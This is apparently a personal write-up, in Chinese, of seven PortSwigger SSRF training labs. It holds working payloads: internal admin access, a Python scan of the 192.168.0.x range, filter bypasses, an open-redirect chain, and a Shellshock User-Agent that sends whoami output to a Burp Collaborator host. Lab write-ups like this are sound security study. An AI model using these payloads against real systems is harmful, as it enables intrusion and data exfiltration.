# Server-side request forgery (SSRF)

## [Lab: Basic SSRF against the local server](https://portswigger.net/web-security/ssrf/lab-basic-ssrf-against-localhost)
### 題目敘述
 This lab has a stock check feature which fetches data from an internal system.

To solve the lab, change the stock check URL to access the admin interface at http://localhost/admin and delete the user carlos. 
### 題目解釋
任意發 HTTP GET Request
### 解答

觀察 Stock check 的 API 發現他會去戳
```
http%3A%2F%2Fstock.weliketoshop.net%3A8080%2Fproduct%2Fstock%2Fcheck%3FproductId%3D1%26storeId%3D1
```

改送 
```
http%3a%2f%2flocalhost%2fadmin
```

發現就能看到 admin 介面


再送
```
http%3A%2F%2Flocalhost%2Fadmin%2Fdelete%3Fusername%3Dcarlos
```



## [Lab: Basic SSRF against another back-end system](https://portswigger.net/web-security/ssrf/lab-basic-ssrf-against-backend-system)
### 題目敘述
 This lab has a stock check feature which fetches data from an internal system.

To solve the lab, use the stock check functionality to scan the internal 192.168.0.X range for an admin interface on port 8080, then use it to delete the user carlos. 

### 題目解釋
SSRF 掃 IP

### 解答

```python
import requests

cookies = {
    'session': 'bakLqRkoOwdV224pxVilyjKiDSlR2Md5',
}

headers = {
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:91.0) Gecko/20100101 Firefox/91.0 Waterfox/91.6.0',
    'Accept': '*/*',
    'Accept-Language': 'zh-TW,zh-HK;q=0.8,zh-CN;q=0.7,zh-SG;q=0.5,en-US;q=0.3,en;q=0.2',
    'Referer': 'https://acc01f151fe80e6ec05765910024002e.web-security-academy.net/product?productId=1',
    'Content-Type': 'application/x-www-form-urlencoded',
    'Origin': 'https://acc01f151fe80e6ec05765910024002e.web-security-academy.net',
    'Connection': 'keep-alive',
    'Sec-Fetch-Dest': 'empty',
    'Sec-Fetch-Mode': 'cors',
    'Sec-Fetch-Site': 'same-origin',
    'TE': 'trailers',
}

for i in range(1,256):
    data = {
    'stockApi': f'http://192.168.0.{i}:8080/admin'
    }

    response = requests.post('https://acc01f151fe80e6ec05765910024002e.web-security-academy.net/product/stock', headers=headers, cookies=cookies, data=data)
    if response.status_code == 200:
        print("!!!!!!!", i, "Success")
        break
    else:
        print(i, "Fail")
# print(response.status_code)
```

刷到 214 才找到 QQ

```
http://192.168.0.214:8080/admin
```


```
http%3A%2F%2F192.168.0.214%3A8080%2Fadmin%2Fdelete%3Fusername%3Dcarlos
```


## [Lab: SSRF with blacklist-based input filter](https://portswigger.net/web-security/ssrf/lab-ssrf-with-blacklist-filter)
### 題目敘述
 This lab has a stock check feature which fetches data from an internal system.

To solve the lab, change the stock check URL to access the admin interface at http://localhost/admin and delete the user carlos.

The developer has deployed two weak anti-SSRF defenses that you will need to bypass. 

### 題目解釋
繞 localhost， path 可能可以用大小寫來繞

### 解答

直接戳 `http://localhost/` 會噴 

```
"External stock check blocked for security reasons"
```

發現用 `http://127.0.0.2` 就可以ㄌ，但是後面打 `admin` 還是會噴

改用 `http://127.0.0.2/ADMIN` 就可以ㄌ

```
http://127.0.0.2/ADMIN/delete?username=carlos
```

## [Lab: SSRF with whitelist-based input filter](https://portswigger.net/web-security/ssrf/lab-ssrf-with-whitelist-filter)
### 題目敘述
 This lab has a stock check feature which fetches data from an internal system.

To solve the lab, change the stock check URL to access the admin interface at http://localhost/admin and delete the user carlos.

The developer has deployed an anti-SSRF defense you will need to bypass. 
### 題目解釋
用 URL 上帶帳號密碼的方法來騙 Domain

### 解答

如果我下 `http://localhost` 他會噴

```
"External stock check host must be stock.weliketoshop.net"
```

可以試著用這樣的想法

```
http://localhost:80#@stock.weliketoshop.net/
```

不過 `#` 需要 Double URL Encode，也就是改寫成 %2523

```
http://localhost:80#@stock.weliketoshop.net/
```

接下來是路徑方面的問題，測試了很久才發現可以加在最後面，加在前面卻不行，但我也不知道為什麼 QQ

```
http://localhost:80%2523@stock.weliketoshop.net/admin/delete?username%3dcarlos
```

## [Lab: SSRF with filter bypass via open redirection vulnerability](https://portswigger.net/web-security/ssrf/lab-ssrf-filter-bypass-via-open-redirection)

### 題目敘述
 This lab has a stock check feature which fetches data from an internal system.

To solve the lab, change the stock check URL to access the admin interface at http://192.168.0.12:8080/admin and delete the user carlos.

The stock checker has been restricted to only access the local application, so you will need to find an open redirect affecting the application first. 
### 題目解釋
尋找網頁其他地方的 Open redirect

### 解答

送出去發現他只有帶了下面這樣的參數
```
%2Fproduct%2Fstock%2Fcheck%3FproductId%3D1%26storeId%3D1
```

如果亂輸入

```
stockApi=%2F..%2F..%2F..%2F..%2F..%index.php
```

他會噴錯

```
"Invalid external stock check url 'Malformed escape pair at index 34: http://localhost:80/../../../../..%index.php'"
```

觀察網頁原始碼會發現有 Next Product 的功能可以用

```
/product/nextProduct?currentProductId=1&path=/product?productId=2">| Next product</a>
```

所以使用

```
%2Fproduct%2FnextProduct%3Fpath%3Dhttp%3A%2F%2F192.168.0.12%3A8080/admin
```

就能看到 admin panel

```
%2Fproduct%2FnextProduct%3Fpath%3Dhttp%3A%2F%2F192.168.0.12%3A8080/admin/delete?username=carlos
```

## [Lab: Blind SSRF with out-of-band detection](https://portswigger.net/web-security/ssrf/blind/lab-out-of-band-detection)
### 題目敘述
 This site uses analytics software which fetches the URL specified in the Referer header when a product page is loaded.

To solve the lab, use this functionality to cause an HTTP request to the public Burp Collaborator server. 
### 題目解釋
用 HTTP Referer 來做 OOB 的 SSRF

### 解答

Referer header，開啟 Collaborator client 把網址送 Referer 就好

```
GET /product?productId=2 HTTP/1.1
Host: ac6e1f911ff22dd9c0ee0b6e00f300d7.web-security-academy.net
Cookie: session=VP2Oaz6VIxbvSKK03UXx0yMmg17E5abY
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: http://im86ep70w6p6ke8gmrthwsmih9n0bp.burpcollaborator.net/
Upgrade-Insecure-Requests: 1
X-Forwarded-For: 127.0.0.1
X-Originating-Ip: 127.0.0.1
X-Remote-Ip: 127.0.0.1
X-Remote-Addr: 127.0.0.1
Te: trailers
Connection: close
```

## [Lab: Blind SSRF with Shellshock exploitation](https://portswigger.net/web-security/ssrf/blind/lab-shellshock-exploitation)
### 題目敘述
 This site uses analytics software which fetches the URL specified in the Referer header when a product page is loaded.

To solve the lab, use this functionality to perform a blind SSRF attack against an internal server in the 192.168.0.X range on port 8080. In the blind attack, use a Shellshock payload against the internal server to exfiltrate the name of the OS user. 

### 題目解釋
SSRF 在 Referer，並在 UA 帶 Shell shock payload

### 解答
```python
import requests

for i in range(1,256):
    cookies = {
        'session': 'd0A7cG617IPPfle2YaV08AQy4DSwhBHk',
    }

    headers = {
        'User-Agent': r'() { :; }; /usr/bin/nslookup $(whoami).j7r7zqs1h7a75fth7seiht7j2a83ws.burpcollaborator.net',
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
        'Accept-Language': 'en-US,en;q=0.5',
        'Connection': 'keep-alive',
        'Referer': f'http://192.168.0.{i}:8080',
        'Upgrade-Insecure-Requests': '1',
        'X-Forwarded-For': '127.0.0.1',
        'X-Originating-IP': '127.0.0.1',
        'X-Remote-IP': '127.0.0.1',
        'X-Remote-Addr': '127.0.0.1',
        'TE': 'Trailers',
    }

    params = (
        ('productId', '1'),
    )

    response = requests.get('https://ac871f1c1f738336c04f055b004e00c7.web-security-academy.net/product', headers=headers, params=params, cookies=cookies)

    print(i,response.status_code,len(response.text))
```
